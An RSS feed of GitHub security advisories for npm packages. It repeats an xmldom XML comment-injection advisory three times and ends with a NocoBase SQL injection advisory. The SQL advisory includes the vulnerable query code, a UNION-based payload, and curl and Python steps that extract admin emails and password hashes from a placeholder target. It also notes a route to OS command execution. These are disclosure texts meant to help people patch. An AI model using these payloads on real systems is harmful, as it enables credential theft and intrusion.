<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-04-22T20:16:20.143Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[xmldom] xmldom has XML node injection through unvalidated comment serialization]]></title>
        <id>https://github.com/advisories/GHSA-j759-j44w-7fr8</id>
        <link href="https://github.com/advisories/GHSA-j759-j44w-7fr8"/>
        <updated>2026-04-22T20:16:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The package allows attacker-controlled comment content to be serialized into XML without validating or neutralizing comment breaking sequences. As a result, an attacker can terminate the comment early and inject arbitrary XML nodes into the serialized output.</p>
<hr>
<h2 id="details">Details</h2>
<p>The issue is in the DOM construction and serialization flow for comment nodes.</p>
<p>When <code>createComment(data)</code> is called, the supplied string is stored as comment data through the generic character-data handling path. That content is kept as-is. Later, when the document is serialized, the serializer writes comment nodes by concatenating the XML comment delimiters with the stored <code>node.data</code> value directly.</p>
<p>That behavior is unsafe because XML comments are a syntax-sensitive context. If attacker-controlled input contains a sequence that closes the comment, the serializer does not preserve it as literal comment text. Instead, it emits output where the remainder of the payload is treated as live XML markup.</p>
<p>This is a real injection bug, not a formatting issue. The serializer already applies context-aware handling in other places, such as escaping text nodes and rewriting unsafe CDATA terminators. Comment content does not receive equivalent treatment. Because of that gap, untrusted data can break out of the comment boundary and modify the structure of the final XML document.</p>
<hr>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">const { DOMImplementation, DOMParser, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'root', null);

doc.documentElement.appendChild(
  doc.createComment('--&gt;&lt;injected attr="1"/&gt;&lt;!--')
);

const xml = new XMLSerializer().serializeToString(doc);
console.log(xml);
// &lt;root&gt;&lt;!----&gt;&lt;injected attr="1"/&gt;&lt;!----&gt;&lt;/root&gt;

const reparsed = new DOMParser().parseFromString(xml, 'text/xml');
console.log(reparsed.documentElement.childNodes.item(1).nodeName);
// injected
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An application that uses the package to build XML from untrusted input can be made to emit attacker-controlled elements outside the intended comment boundary. That allows the attacker to alter the meaning and structure of generated XML documents.</p>
<p>In practice, this can affect any workflow that generates XML and then stores it, forwards it, signs it, or hands it to another parser. Realistic targets include XML-based configuration, policy documents, and message formats where downstream consumers trust the serialized structure.</p>
<hr>
<h2 id="disclosure">Disclosure</h2>
<p>This vulnerability was publicly disclosed at 2026-04-06T11:25:07Z via <a href="https://github.com/xmldom/xmldom/pull/987">xmldom/xmldom#987</a>, which was subsequently closed without being merged.</p>
<hr>
<h2 id="fix-applied">Fix Applied</h2>
<blockquote>
<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that pass
untrusted data to <code>createComment()</code> or mutate comment nodes with untrusted input (via
<code>appendData</code>, <code>insertData</code>, <code>replaceData</code>, <code>.data =</code>, or <code>.textContent =</code>) should audit all
<code>serializeToString()</code> call sites and add the option.</p>
</blockquote>
<p><code>XMLSerializer.serializeToString()</code> now accepts an options object as a second argument. When <code>{ requireWellFormed: true }</code> is passed, the serializer throws <code>InvalidStateError</code> before emitting a Comment node whose <code>.data</code> would produce malformed XML.</p>
<p>On <code>@xmldom/xmldom</code> ≥ 0.9.10, the full W3C DOM Parsing §3.2.1.4 check is applied: throws if <code>.data</code> contains <code>--</code> anywhere, ends with <code>-</code>, or contains characters outside the XML Char production.</p>
<p>On <code>@xmldom/xmldom</code> ≥ 0.8.13 (LTS), only the <code>--&gt;</code> injection sequence is checked. The <code>0.8.x</code> SAX parser accepts comments containing <code>--</code> (without <code>&gt;</code>), so throwing on bare <code>--</code> would break a previously-working round-trip on that branch. The <code>--&gt;</code> check is sufficient to prevent injection.</p>
<h3 id="poc--fixed-path">PoC — fixed path</h3>
<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'root', null);
doc.documentElement.appendChild(doc.createComment('--&gt;&lt;injected attr="1"/&gt;&lt;!--'));

// Default (unchanged): verbatim — injection present
const unsafe = new XMLSerializer().serializeToString(doc);
console.log(unsafe);
// &lt;root&gt;&lt;!----&gt;&lt;injected attr="1"/&gt;&lt;!----&gt;&lt;/root&gt;

// Opt-in guard: throws InvalidStateError before serializing
try {
  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });
} catch (e) {
  console.log(e.name, e.message);
  // InvalidStateError: The comment node data contains "--" or ends with "-"  (0.9.x)
  // InvalidStateError: The comment node data contains "--&gt;"  (0.8.x — only --&gt; is checked)
}
</code></pre>
<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
<p>The W3C DOM Parsing and Serialization spec §3.2.1.4 defines a <code>require well-formed</code> flag whose <strong>default value is <code>false</code></strong>. With the flag unset, the spec explicitly permits serializing ill-formed comment content verbatim — this is also the behavior of browser implementations (Chrome, Firefox, Safari): <code>new XMLSerializer().serializeToString(doc)</code> produces the injection sequence without error in all major browsers.</p>
<p>Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in <code>requireWellFormed: true</code> flag allows applications that require injection safety to enable strict mode without breaking existing deployments.</p>
<h3 id="residual-limitation">Residual limitation</h3>
<p>The fix operates at serialization time only. There is no creation-time check in <code>createComment</code> — the spec does not require one for comment data. Any path that leads to a Comment node with <code>--</code> in its data (<code>createComment</code>, <code>appendData</code>, <code>.data =</code>, etc.) produces a node that serializes safely only when <code>{ requireWellFormed: true }</code> is passed to <code>serializeToString</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-j759-j44w-7fr8">https://github.com/xmldom/xmldom/security/advisories/GHSA-j759-j44w-7fr8</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/987">https://github.com/xmldom/xmldom/pull/987</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/b397540889086da868c30c366ad5c220d1a750c7">https://github.com/xmldom/xmldom/commit/b397540889086da868c30c366ad5c220d1a750c7</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/fda7cc313de30243fea35cada64e0bb12099c2a1">https://github.com/xmldom/xmldom/commit/fda7cc313de30243fea35cada64e0bb12099c2a1</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.13">https://github.com/xmldom/xmldom/releases/tag/0.8.13</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.10">https://github.com/xmldom/xmldom/releases/tag/0.9.10</a></li>
<li><a href="https://github.com/advisories/GHSA-j759-j44w-7fr8">https://github.com/advisories/GHSA-j759-j44w-7fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j759-j44w-7fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T20:16:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom has XML node injection through unvalidated comment serialization]]></title>
        <id>https://github.com/advisories/GHSA-j759-j44w-7fr8</id>
        <link href="https://github.com/advisories/GHSA-j759-j44w-7fr8"/>
        <updated>2026-04-22T20:16:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The package allows attacker-controlled comment content to be serialized into XML without validating or neutralizing comment breaking sequences. As a result, an attacker can terminate the comment early and inject arbitrary XML nodes into the serialized output.</p>
<hr>
<h2 id="details">Details</h2>
<p>The issue is in the DOM construction and serialization flow for comment nodes.</p>
<p>When <code>createComment(data)</code> is called, the supplied string is stored as comment data through the generic character-data handling path. That content is kept as-is. Later, when the document is serialized, the serializer writes comment nodes by concatenating the XML comment delimiters with the stored <code>node.data</code> value directly.</p>
<p>That behavior is unsafe because XML comments are a syntax-sensitive context. If attacker-controlled input contains a sequence that closes the comment, the serializer does not preserve it as literal comment text. Instead, it emits output where the remainder of the payload is treated as live XML markup.</p>
<p>This is a real injection bug, not a formatting issue. The serializer already applies context-aware handling in other places, such as escaping text nodes and rewriting unsafe CDATA terminators. Comment content does not receive equivalent treatment. Because of that gap, untrusted data can break out of the comment boundary and modify the structure of the final XML document.</p>
<hr>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">const { DOMImplementation, DOMParser, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'root', null);

doc.documentElement.appendChild(
  doc.createComment('--&gt;&lt;injected attr="1"/&gt;&lt;!--')
);

const xml = new XMLSerializer().serializeToString(doc);
console.log(xml);
// &lt;root&gt;&lt;!----&gt;&lt;injected attr="1"/&gt;&lt;!----&gt;&lt;/root&gt;

const reparsed = new DOMParser().parseFromString(xml, 'text/xml');
console.log(reparsed.documentElement.childNodes.item(1).nodeName);
// injected
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An application that uses the package to build XML from untrusted input can be made to emit attacker-controlled elements outside the intended comment boundary. That allows the attacker to alter the meaning and structure of generated XML documents.</p>
<p>In practice, this can affect any workflow that generates XML and then stores it, forwards it, signs it, or hands it to another parser. Realistic targets include XML-based configuration, policy documents, and message formats where downstream consumers trust the serialized structure.</p>
<hr>
<h2 id="disclosure">Disclosure</h2>
<p>This vulnerability was publicly disclosed at 2026-04-06T11:25:07Z via <a href="https://github.com/xmldom/xmldom/pull/987">xmldom/xmldom#987</a>, which was subsequently closed without being merged.</p>
<hr>
<h2 id="fix-applied">Fix Applied</h2>
<blockquote>
<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that pass
untrusted data to <code>createComment()</code> or mutate comment nodes with untrusted input (via
<code>appendData</code>, <code>insertData</code>, <code>replaceData</code>, <code>.data =</code>, or <code>.textContent =</code>) should audit all
<code>serializeToString()</code> call sites and add the option.</p>
</blockquote>
<p><code>XMLSerializer.serializeToString()</code> now accepts an options object as a second argument. When <code>{ requireWellFormed: true }</code> is passed, the serializer throws <code>InvalidStateError</code> before emitting a Comment node whose <code>.data</code> would produce malformed XML.</p>
<p>On <code>@xmldom/xmldom</code> ≥ 0.9.10, the full W3C DOM Parsing §3.2.1.4 check is applied: throws if <code>.data</code> contains <code>--</code> anywhere, ends with <code>-</code>, or contains characters outside the XML Char production.</p>
<p>On <code>@xmldom/xmldom</code> ≥ 0.8.13 (LTS), only the <code>--&gt;</code> injection sequence is checked. The <code>0.8.x</code> SAX parser accepts comments containing <code>--</code> (without <code>&gt;</code>), so throwing on bare <code>--</code> would break a previously-working round-trip on that branch. The <code>--&gt;</code> check is sufficient to prevent injection.</p>
<h3 id="poc--fixed-path">PoC — fixed path</h3>
<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'root', null);
doc.documentElement.appendChild(doc.createComment('--&gt;&lt;injected attr="1"/&gt;&lt;!--'));

// Default (unchanged): verbatim — injection present
const unsafe = new XMLSerializer().serializeToString(doc);
console.log(unsafe);
// &lt;root&gt;&lt;!----&gt;&lt;injected attr="1"/&gt;&lt;!----&gt;&lt;/root&gt;

// Opt-in guard: throws InvalidStateError before serializing
try {
  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });
} catch (e) {
  console.log(e.name, e.message);
  // InvalidStateError: The comment node data contains "--" or ends with "-"  (0.9.x)
  // InvalidStateError: The comment node data contains "--&gt;"  (0.8.x — only --&gt; is checked)
}
</code></pre>
<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
<p>The W3C DOM Parsing and Serialization spec §3.2.1.4 defines a <code>require well-formed</code> flag whose <strong>default value is <code>false</code></strong>. With the flag unset, the spec explicitly permits serializing ill-formed comment content verbatim — this is also the behavior of browser implementations (Chrome, Firefox, Safari): <code>new XMLSerializer().serializeToString(doc)</code> produces the injection sequence without error in all major browsers.</p>
<p>Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in <code>requireWellFormed: true</code> flag allows applications that require injection safety to enable strict mode without breaking existing deployments.</p>
<h3 id="residual-limitation">Residual limitation</h3>
<p>The fix operates at serialization time only. There is no creation-time check in <code>createComment</code> — the spec does not require one for comment data. Any path that leads to a Comment node with <code>--</code> in its data (<code>createComment</code>, <code>appendData</code>, <code>.data =</code>, etc.) produces a node that serializes safely only when <code>{ requireWellFormed: true }</code> is passed to <code>serializeToString</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-j759-j44w-7fr8">https://github.com/xmldom/xmldom/security/advisories/GHSA-j759-j44w-7fr8</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/987">https://github.com/xmldom/xmldom/pull/987</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/b397540889086da868c30c366ad5c220d1a750c7">https://github.com/xmldom/xmldom/commit/b397540889086da868c30c366ad5c220d1a750c7</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/fda7cc313de30243fea35cada64e0bb12099c2a1">https://github.com/xmldom/xmldom/commit/fda7cc313de30243fea35cada64e0bb12099c2a1</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.13">https://github.com/xmldom/xmldom/releases/tag/0.8.13</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.10">https://github.com/xmldom/xmldom/releases/tag/0.9.10</a></li>
<li><a href="https://github.com/advisories/GHSA-j759-j44w-7fr8">https://github.com/advisories/GHSA-j759-j44w-7fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j759-j44w-7fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T20:16:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom has XML node injection through unvalidated comment serialization]]></title>
        <id>https://github.com/advisories/GHSA-j759-j44w-7fr8</id>
        <link href="https://github.com/advisories/GHSA-j759-j44w-7fr8"/>
        <updated>2026-04-22T20:16:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The package allows attacker-controlled comment content to be serialized into XML without validating or neutralizing comment breaking sequences. As a result, an attacker can terminate the comment early and inject arbitrary XML nodes into the serialized output.</p>
<hr>
<h2 id="details">Details</h2>
<p>The issue is in the DOM construction and serialization flow for comment nodes.</p>
<p>When <code>createComment(data)</code> is called, the supplied string is stored as comment data through the generic character-data handling path. That content is kept as-is. Later, when the document is serialized, the serializer writes comment nodes by concatenating the XML comment delimiters with the stored <code>node.data</code> value directly.</p>
<p>That behavior is unsafe because XML comments are a syntax-sensitive context. If attacker-controlled input contains a sequence that closes the comment, the serializer does not preserve it as literal comment text. Instead, it emits output where the remainder of the payload is treated as live XML markup.</p>
<p>This is a real injection bug, not a formatting issue. The serializer already applies context-aware handling in other places, such as escaping text nodes and rewriting unsafe CDATA terminators. Comment content does not receive equivalent treatment. Because of that gap, untrusted data can break out of the comment boundary and modify the structure of the final XML document.</p>
<hr>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">const { DOMImplementation, DOMParser, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'root', null);

doc.documentElement.appendChild(
  doc.createComment('--&gt;&lt;injected attr="1"/&gt;&lt;!--')
);

const xml = new XMLSerializer().serializeToString(doc);
console.log(xml);
// &lt;root&gt;&lt;!----&gt;&lt;injected attr="1"/&gt;&lt;!----&gt;&lt;/root&gt;

const reparsed = new DOMParser().parseFromString(xml, 'text/xml');
console.log(reparsed.documentElement.childNodes.item(1).nodeName);
// injected
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An application that uses the package to build XML from untrusted input can be made to emit attacker-controlled elements outside the intended comment boundary. That allows the attacker to alter the meaning and structure of generated XML documents.</p>
<p>In practice, this can affect any workflow that generates XML and then stores it, forwards it, signs it, or hands it to another parser. Realistic targets include XML-based configuration, policy documents, and message formats where downstream consumers trust the serialized structure.</p>
<hr>
<h2 id="disclosure">Disclosure</h2>
<p>This vulnerability was publicly disclosed at 2026-04-06T11:25:07Z via <a href="https://github.com/xmldom/xmldom/pull/987">xmldom/xmldom#987</a>, which was subsequently closed without being merged.</p>
<hr>
<h2 id="fix-applied">Fix Applied</h2>
<blockquote>
<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that pass
untrusted data to <code>createComment()</code> or mutate comment nodes with untrusted input (via
<code>appendData</code>, <code>insertData</code>, <code>replaceData</code>, <code>.data =</code>, or <code>.textContent =</code>) should audit all
<code>serializeToString()</code> call sites and add the option.</p>
</blockquote>
<p><code>XMLSerializer.serializeToString()</code> now accepts an options object as a second argument. When <code>{ requireWellFormed: true }</code> is passed, the serializer throws <code>InvalidStateError</code> before emitting a Comment node whose <code>.data</code> would produce malformed XML.</p>
<p>On <code>@xmldom/xmldom</code> ≥ 0.9.10, the full W3C DOM Parsing §3.2.1.4 check is applied: throws if <code>.data</code> contains <code>--</code> anywhere, ends with <code>-</code>, or contains characters outside the XML Char production.</p>
<p>On <code>@xmldom/xmldom</code> ≥ 0.8.13 (LTS), only the <code>--&gt;</code> injection sequence is checked. The <code>0.8.x</code> SAX parser accepts comments containing <code>--</code> (without <code>&gt;</code>), so throwing on bare <code>--</code> would break a previously-working round-trip on that branch. The <code>--&gt;</code> check is sufficient to prevent injection.</p>
<h3 id="poc--fixed-path">PoC — fixed path</h3>
<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'root', null);
doc.documentElement.appendChild(doc.createComment('--&gt;&lt;injected attr="1"/&gt;&lt;!--'));

// Default (unchanged): verbatim — injection present
const unsafe = new XMLSerializer().serializeToString(doc);
console.log(unsafe);
// &lt;root&gt;&lt;!----&gt;&lt;injected attr="1"/&gt;&lt;!----&gt;&lt;/root&gt;

// Opt-in guard: throws InvalidStateError before serializing
try {
  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });
} catch (e) {
  console.log(e.name, e.message);
  // InvalidStateError: The comment node data contains "--" or ends with "-"  (0.9.x)
  // InvalidStateError: The comment node data contains "--&gt;"  (0.8.x — only --&gt; is checked)
}
</code></pre>
<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
<p>The W3C DOM Parsing and Serialization spec §3.2.1.4 defines a <code>require well-formed</code> flag whose <strong>default value is <code>false</code></strong>. With the flag unset, the spec explicitly permits serializing ill-formed comment content verbatim — this is also the behavior of browser implementations (Chrome, Firefox, Safari): <code>new XMLSerializer().serializeToString(doc)</code> produces the injection sequence without error in all major browsers.</p>
<p>Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in <code>requireWellFormed: true</code> flag allows applications that require injection safety to enable strict mode without breaking existing deployments.</p>
<h3 id="residual-limitation">Residual limitation</h3>
<p>The fix operates at serialization time only. There is no creation-time check in <code>createComment</code> — the spec does not require one for comment data. Any path that leads to a Comment node with <code>--</code> in its data (<code>createComment</code>, <code>appendData</code>, <code>.data =</code>, etc.) produces a node that serializes safely only when <code>{ requireWellFormed: true }</code> is passed to <code>serializeToString</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-j759-j44w-7fr8">https://github.com/xmldom/xmldom/security/advisories/GHSA-j759-j44w-7fr8</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/987">https://github.com/xmldom/xmldom/pull/987</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/b397540889086da868c30c366ad5c220d1a750c7">https://github.com/xmldom/xmldom/commit/b397540889086da868c30c366ad5c220d1a750c7</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/fda7cc313de30243fea35cada64e0bb12099c2a1">https://github.com/xmldom/xmldom/commit/fda7cc313de30243fea35cada64e0bb12099c2a1</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.13">https://github.com/xmldom/xmldom/releases/tag/0.8.13</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.10">https://github.com/xmldom/xmldom/releases/tag/0.9.10</a></li>
<li><a href="https://github.com/advisories/GHSA-j759-j44w-7fr8">https://github.com/advisories/GHSA-j759-j44w-7fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j759-j44w-7fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T20:16:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nocobase/database] @nocobase/database has SQL Injection via String Concatenation through Recursive Eager Loading]]></title>
        <id>https://github.com/advisories/GHSA-4948-f92q-f432</id>
        <link href="https://github.com/advisories/GHSA-4948-f92q-f432"/>
        <updated>2026-04-22T20:09:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>queryParentSQL()</code> function in the core database package constructs a recursive CTE query by joining <code>nodeIds</code> with string concatenation instead of using parameterized queries. The <code>nodeIds</code> array contains primary key values read from database rows. An attacker who can create a record with a malicious string primary key can inject arbitrary SQL when any subsequent request triggers recursive eager loading on that collection.</p>
<p><strong>Affected component:</strong> <code>@nocobase/database</code> (core)
<strong>Affected versions:</strong> &lt;= 2.0.32 (confirmed)
<strong>Minimum privilege:</strong> Any user with record-creation permission on a tree collection with string-type primary keys</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<p><code>packages/core/database/src/eager-loading/eager-loading-tree.ts:59-84</code></p>
<pre><code class="language-javascript">const queryParentSQL = (options: {
  db: Database;
  nodeIds: any[];
  collection: Collection;
  foreignKey: string;
  targetKey: string;
}) =&gt; {
  const { collection, db, nodeIds } = options;
  const tableName = collection.quotedTableName();
  const { foreignKey, targetKey } = options;
  const foreignKeyField = collection.model.rawAttributes[foreignKey].field;
  const targetKeyField = collection.model.rawAttributes[targetKey].field;

  const queryInterface = db.sequelize.getQueryInterface();
  const q = queryInterface.quoteIdentifier.bind(queryInterface);
  return `WITH RECURSIVE cte AS (
      SELECT ${q(targetKeyField)}, ${q(foreignKeyField)}
      FROM ${tableName}
      WHERE ${q(targetKeyField)} IN ('${nodeIds.join("','")}')  // &lt;-- INJECTION
      UNION ALL
      SELECT t.${q(targetKeyField)}, t.${q(foreignKeyField)}
      FROM ${tableName} AS t
      INNER JOIN cte ON t.${q(targetKeyField)} = cte.${q(foreignKeyField)}
      )
      SELECT ${q(targetKeyField)} AS ${q(targetKey)}, ${q(foreignKeyField)} AS ${q(foreignKey)} FROM cte`;
};
</code></pre>
<p>This function is called at line 384 when a <code>BelongsTo</code> association has <code>recursively: true</code> and instances exist:</p>
<pre><code class="language-javascript">// eager-loading-tree.ts:382-395
if (node.includeOption.recursively &amp;&amp; instances.length &gt; 0) {
    const targetKey = association.targetKey;
    const sql = queryParentSQL({
        db: this.db, collection, foreignKey, targetKey,
        nodeIds: instances.map((instance) =&gt; instance.get(targetKey)), // from DB rows
    });
    const results = await this.db.sequelize.query(sql, { type: 'SELECT', transaction });
}
</code></pre>
<h2 id="poc">PoC</h2>
<p>The payload keeps the CTE syntactically valid by injecting a third <code>UNION ALL</code> branch. The closing <code>')</code> from the original template literal completes the injected <code>WHERE</code> clause, and the remaining <code>UNION ALL ... INNER JOIN ... SELECT ... FROM cte</code> lines stay intact.</p>
<pre><code>Injection ID value:
  root') UNION ALL SELECT CAST((SELECT email FROM users LIMIT 1) AS integer)::text, NULL::text WHERE ('1'='1

Generated SQL (3 valid UNION ALL branches):
  WITH RECURSIVE cte AS (
    SELECT "id", "parentId" FROM "table"
    WHERE "id" IN ('root','root') UNION ALL SELECT CAST((...) AS integer)::text, NULL::text WHERE ('1'='1')
    UNION ALL
    SELECT t."id", t."parentId" FROM "table" AS t INNER JOIN cte ON t."id" = cte."parentId"
  ) SELECT "id" AS "id", "parentId" AS "parentId" FROM cte

The CAST-to-integer triggers a runtime error whose message contains the subquery result.
</code></pre>
<pre><code class="language-bash">TOKEN="&lt;jwt_token&gt;"

# 1. Create tree collection with string PKs
curl -s http://TARGET:13000/api/collections:create \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"vuln_tree","tree":"adjacencyList","fields":[
    {"name":"id","type":"string","primaryKey":true,"interface":"input"},
    {"name":"title","type":"string","interface":"input"},
    {"name":"parent","type":"belongsTo","target":"vuln_tree","foreignKey":"parentId","targetKey":"id","treeParent":true},
    {"name":"children","type":"hasMany","target":"vuln_tree","foreignKey":"parentId","sourceKey":"id","treeChildren":true}
  ]}'

# 2. Create safe root
curl -s http://TARGET:13000/api/vuln_tree:create \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"id":"root","title":"Root"}'

# 3. Create injection parent — error-based extraction of admin email
python3 -c "
import requests, json
headers = {'Authorization': 'Bearer $TOKEN', 'Content-Type': 'application/json'}
payload_id = \"root') UNION ALL SELECT CAST((SELECT email FROM users LIMIT 1) AS integer)::text, NULL::text WHERE ('1'='1\"
requests.post('http://TARGET:13000/api/vuln_tree:create', headers=headers,
    json={'id': payload_id, 'title': 'x'})
requests.post('http://TARGET:13000/api/vuln_tree:create', headers=headers,
    json={'id': 'child', 'title': 'c', 'parentId': payload_id})
r = requests.get('http://TARGET:13000/api/vuln_tree:list', headers=headers,
    params={'appends[]': 'parent(recursively=true)', 'pageSize': '100'})
print(json.dumps(r.json(), indent=2))
"
# Returns: 500 {"errors":[{"message":"invalid input syntax for type integer: \"admin@nocobase.com\""}]}
#                                                                          ^^^^^^^^^^^^^^^^^^^^^^^
#                                                             Exfiltrated data in error message
</code></pre>
<p><strong>Confirmed extractions (tested against NocoBase v2.0.32 + PostgreSQL 16.13):</strong></p>
<table>
<thead>
<tr>
<th>Subquery</th>
<th>Extracted Value</th>
</tr>
</thead>
<tbody><tr>
<td><code>SELECT version()</code></td>
<td><code>PostgreSQL 16.13 (Debian 16.13-1.pgdg13+1) on aarch64-unknown-linux-gnu...</code></td>
</tr>
<tr>
<td><code>SELECT current_database()</code></td>
<td><code>nocobase</code></td>
</tr>
<tr>
<td><code>SELECT email FROM users ORDER BY id LIMIT 1</code></td>
<td><code>admin@nocobase.com</code></td>
</tr>
<tr>
<td><code>SELECT password FROM users ORDER BY id LIMIT 1</code></td>
<td><code>006af6756e9660888c44ab311fe992341af0ecab4aaf13e48c8d0001948acc38</code></td>
</tr>
<tr>
<td>`SELECT string_agg(email||':'</td>
<td></td>
</tr>
</tbody></table>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Confidentiality:</strong> Error-based extraction of any database value. Full credential dump confirmed (emails + password hashes).</li>
<li><strong>Integrity:</strong> Depending on database user privileges, INSERT/UPDATE/DELETE through stacked queries.</li>
<li><strong>Availability:</strong> Resource-exhaustive queries or destructive DDL.</li>
<li><strong>Scope change:</strong> On PostgreSQL with superuser, <code>COPY ... TO PROGRAM</code> achieves OS command execution.</li>
<li><strong>Blast radius:</strong> Affects all collections using tree/adjacency-list structure with string-type primary keys. The same concatenation pattern also exists in <code>plugin-field-sort/src/server/sort-field.ts:124</code>.</li>
</ul>
<h2 id="fix-suggestion">Fix Suggestion</h2>
<ol>
<li><p><strong>Use parameterized queries.</strong> Replace the string concatenation with bind parameters:</p>
<pre><code class="language-javascript">const placeholders = nodeIds.map((_, i) =&gt; `$${i + 1}`).join(',');
const sql = `WITH RECURSIVE cte AS (
    SELECT ${q(targetKeyField)}, ${q(foreignKeyField)}
    FROM ${tableName}
    WHERE ${q(targetKeyField)} IN (${placeholders})
    UNION ALL
    ...
) SELECT ... FROM cte`;
return { sql, bind: nodeIds };
</code></pre>
<p>Then call <code>db.sequelize.query(sql, { type: 'SELECT', bind: nodeIds, transaction })</code>.</p>
</li>
<li><p><strong>Apply the same fix to <code>plugin-field-sort/src/server/sort-field.ts:124</code></strong>, which has an identical concatenation pattern with <code>filteredScopeValue</code>.</p>
</li>
<li><p><strong>Validate primary key values</strong> at record creation time. Reject or escape values containing SQL metacharacters (<code>'</code>, <code>"</code>, <code>;</code>, <code>--</code>) in string-type primary key fields.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-4948-f92q-f432">https://github.com/nocobase/nocobase/security/advisories/GHSA-4948-f92q-f432</a></li>
<li><a href="https://github.com/nocobase/nocobase/pull/9133">https://github.com/nocobase/nocobase/pull/9133</a></li>
<li><a href="https://github.com/nocobase/nocobase/commit/202e2b8efe44ba90adbf1087f6f70881ff947604">https://github.com/nocobase/nocobase/commit/202e2b8efe44ba90adbf1087f6f70881ff947604</a></li>
<li><a href="https://github.com/advisories/GHSA-4948-f92q-f432">https://github.com/advisories/GHSA-4948-f92q-f432</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4948-f92q-f432</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T20:09:02.000Z</published>
